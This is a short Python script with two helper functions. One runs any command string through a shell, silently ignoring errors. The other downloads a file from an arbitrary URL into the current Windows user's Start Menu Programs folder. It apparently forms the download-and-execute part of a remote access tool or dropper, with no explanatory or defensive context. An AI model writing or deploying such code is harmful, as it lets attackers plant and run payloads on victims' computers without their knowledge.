import os
import sys
import requests
import subprocess
from subprocess import PIPE

def start(command):
    try:
        subprocess.Popen([command],shell=True)
           # os.startfile(command)
    except:
        pass


def download(command):
    name = '/' + str(command).split('/')[-1]
    response = requests.get(command, stream=True)

    if response.status_code == 200:
        with open(r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs'.format(os.getlogin()) + name, 'wb') as f:
            for chunk in response:
                f.write(chunk)

#subprocess.Popen(['taskkill /IM mspaint.exe /F'],shell=True,encoding='utf-8')